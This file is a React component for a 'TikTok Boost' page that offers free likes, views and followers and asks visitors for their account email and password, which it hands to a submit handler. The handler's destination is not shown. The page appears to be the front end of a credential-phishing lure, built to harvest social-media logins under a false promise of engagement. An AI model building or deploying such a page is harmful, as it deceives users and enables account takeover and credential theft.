import { useState } from 'react';
import { Mail, Lock, Zap } from 'lucide-react';

interface MainFormProps {
  onSubmit: (data: { email: string; password: string; service: string }) => void;
}

export default function MainForm({ onSubmit }: MainFormProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [service, setService] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!email || !password || !service) {
      alert('Please fill all fields');
      return;
    }

    onSubmit({ email, password, service });
  };

  return (
    <div className="max-w-md mx-auto">
      <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
        <div className="bg-gradient-to-r from-pink-500 via-purple-500 to-blue-500 p-6 text-center">
          <h1 className="text-3xl font-bold text-white mb-2">TikTok Boost</h1>
          <p className="text-white text-opacity-90">Get Likes, Views & Followers</p>
        </div>

        <div className="p-8">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="relative">
              <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter account email"
                className="w-full pl-12 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors"
              />
            </div>

            <div className="relative">
              <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter Password"
                className="w-full pl-12 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors"
              />
            </div>

            <div className="relative">
              <Zap className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
              <select
                value={service}
                onChange={(e) => setService(e.target.value)}
                className="w-full pl-12 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors appearance-none bg-white"
              >
                <option value="" disabled>Choose Service</option>
                <option value="300 Likes">300 Likes</option>
                <option value="1000 Views">1000 Views</option>
                <option value="100 Followers">100 Followers</option>
              </select>
            </div>

            <button
              type="submit"
              className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-semibold py-3 rounded-lg shadow-lg transition-all duration-300 transform hover:scale-105"
            >
              Submit Request
            </button>
          </form>
        </div>
      </div>

      <div className="mt-8 grid grid-cols-3 gap-4">
        <div className="bg-white rounded-xl shadow-md p-4 text-center">
          <div className="text-2xl font-bold text-pink-500 mb-1">Likes</div>
          <div className="text-sm text-gray-600">Boost Engagement</div>
        </div>
        <div className="bg-white rounded-xl shadow-md p-4 text-center">
          <div className="text-2xl font-bold text-purple-500 mb-1">Views</div>
          <div className="text-sm text-gray-600">Increase Reach</div>
        </div>
        <div className="bg-white rounded-xl shadow-md p-4 text-center">
          <div className="text-2xl font-bold text-blue-500 mb-1">Followers</div>
          <div className="text-sm text-gray-600">Grow Audience</div>
        </div>
      </div>
    </div>
  );
}
